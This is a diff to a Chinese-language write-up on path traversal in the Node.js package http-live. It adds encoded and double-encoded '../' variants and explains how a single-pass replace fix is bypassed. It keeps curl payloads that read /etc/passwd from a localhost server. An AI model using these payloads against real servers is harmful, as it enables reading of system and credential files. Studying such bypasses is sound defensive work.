@@ -40,6 +40,27 @@ cat ././../././1.txt
 ```
 
 
+Encoding and double encoding:
+
+```
+%2e%2e%2f represents ../
+%2e%2e/ represents ../
+..%2f represents ../ 
+%2e%2e%5c represents ..\
+%2e%2e\ represents ..\ 
+..%5c represents ..\ 
+%252e%252e%255c represents ..\ 
+..%255c represents ..\
+```
+
+URL encoding
+
+Web容器对form和URL中的"百分比编码"执行一级解码(one level of decoding)
+```
+..%c0%af represents ../ 
+..%c1%9c represents ..\ 
+```
+
 ### 实例1 - 单次替换
 
 代码仓库
@@ -65,20 +86,20 @@ http-live
 
 # 构造payload如下 都成功了
 
-# 绕过方式1  将 `/../` 替换为 `//../../`
+# payload1  将 `/../` 替换为 `//../../`
 curl --path-as-is http://localhost:8080//../../../../etc/passwd
 # 最终绝对路径为/Users/xxx/Downloads/../../../etc/passwd
 
-# 绕过方式2  将 `/../` 替换为 `/./.././`
+# payload2  将 `/../` 替换为 `/./.././`
 curl --path-as-is http://localhost:8080/./../././../././../././.././etc/passwd
 # 最终绝对路径为/Users/xxx/Downloads/.././../././../././.././etc/passwd
 # 为了便于理解 可以自行去除其中无实际作用的./ 得到与绕过方式1相同的最终绝对路径 /Users/xxx/Downloads/../../../../etc/passwd
 ```
 
-分析绕过方式1 根据bin/http-live跟下后端逻辑
+payload1绕过过程分析 查看文件bin/http-live可知后端逻辑如下
 ```
-# 最开始接到pathname的参数值
-# //../../../../etc/passwd
+# 71行 var pathname = url.parse(req.url, true).pathname;
+# 直接从url中获取pathname的参数值 得到 //../../../../etc/passwd
 # 72行 pathname = pathname.replace("/../","");  将参数值中的`/../` 替换为空 仅替换一次(修复无效 可被绕过).
 # 此时 pathname参数值变为 /../../../etc/passwd
 # 90行 拼接得到绝对路径 abspath = process.cwd() + pathname; #注意 process.cwd()返回当前目录/Users/xxx/Downloads 注意结尾不是斜杠符号
@@ -103,10 +124,14 @@ while(pathname.indexOf("/../") != -1) {
 	}
 ```
 
-
 ---
 
-另外，看下node自带的fs模块的readFile函数
+为什么不用`\`测试？
+因为node库中 url.parse函数 会把\转换为/ 参考node自带库中url.parse的定义 https://github.com/nodejs/node/blob/master/lib/url.js
+
+
+#### 总结 - node自带的fs模块的readFile函数
+
 
 1.读取普通文件
 ```
